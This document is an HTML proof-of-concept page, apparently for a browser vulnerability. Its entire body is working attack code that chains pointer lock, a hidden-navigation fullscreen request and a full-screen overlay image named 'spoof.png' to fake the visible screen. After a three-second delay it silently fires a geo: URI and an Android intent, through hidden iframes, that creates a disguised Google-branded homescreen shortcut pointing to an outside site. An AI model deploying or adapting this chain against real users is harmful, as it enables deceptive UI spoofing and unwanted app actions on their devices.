<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
    <title>Ultimate Chaining & Delayed Intent PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        width: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
      }
      #fullscreenElement {
        position: relative;
        width: 100%;
        height: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
      }
      #spoof {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        min-width: 100vw;
        min-height: 100vh;
        object-fit: cover;
        z-index: 2147483647;
        pointer-events: none;
      }
      #pointerLockElement {
        width: 1px;
        height: 1px;
        position: absolute;
        opacity: 0;
      }
    </style>
    <script>
      addEventListener("touchstart", (event) => {});
      window.ontouchstart = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.focus();
      };

      addEventListener("touchend", (event) => {});
      window.ontouchend = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.blur();
      };
    </script>
  </head>
  <body>
    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />

    <div id="pointerLockElement"></div>

    <div id="fullscreenElement">
      <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">

      <div class="container" id="mainContainer">
        <button id="execBtn">INITIALIZE FULL CHAINING & DELAYED INTENT</button>
        <div class="info" id="statusInfo">Status: Ready for interaction.</div>
      </div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = async function () {
        statusInfo.innerText = "Status: Executing pointer lock & entering fullscreen...";
        this.style.display = "none";

        try {
          // 1. Chaining Step 1: Pointer Lock Activation
          let plElement = document.getElementById("pointerLockElement");
          if (plElement && plElement.requestPointerLock) {
            await plElement.requestPointerLock().catch((err) => {
              console.debug("PointerLock chained catch:", err.message);
            });
          }

          // 2. Chaining Step 2: Instan menampilkan visual overlay spoof.png
          let spoofImg = document.getElementById("spoof");
          if (spoofImg) {
            spoofImg.style.display = "block";
          }

          // 3. Chaining Step 3: Eksekusi Fullscreen terlebih dahulu secara instan
          let fsElement = document.getElementById("fullscreenElement") || document.documentElement;

          let requestFS = fsElement.requestFullscreen || 
                          fsElement.webkitRequestFullscreen || 
                          fsElement.mozRequestFullScreen || 
                          fsElement.msRequestFullscreen;

          if (requestFS) {
            try {
              await requestFS.call(fsElement, { navigationUI: "hide" });
            } catch (err) {
              try {
                await requestFS.call(fsElement);
              } catch (e) {
                console.debug("Fullscreen chain fallback error:", e.message);
              }
            }
          }

          let container = document.getElementById("mainContainer");
          if (container) {
            container.style.display = "none";
          }

          statusInfo.innerText = "Status: Fullscreen active. Geo & Android intent will trigger in 3 seconds...";

          // 4. Chaining Step 4: Geo URI & Android Intent dispatch otomatis setelah jeda waktu 3 detik
          setTimeout(() => {
            statusInfo.innerText = "Status: Dispatching Geo & Android Intent payloads...";

            // Memanggil geo protocol iframe
            let geoFrame = document.createElement("iframe");
            geoFrame.style.display = "none";
            geoFrame.src = "geo:0,0?q=apple.com";
            document.body.appendChild(geoFrame);

            // Memanggil Android Intent NDevTK
            let intentFrame = document.createElement("iframe");
            intentFrame.style.display = "none";
            intentFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
            document.body.appendChild(intentFrame);

          }, 3000);

        } catch (err) {
          statusInfo.innerText = "Status: Chaining execution error: " + err.message;
          execButton.style.display = "block";
        }
      };
    </script>
  </body>
</html>
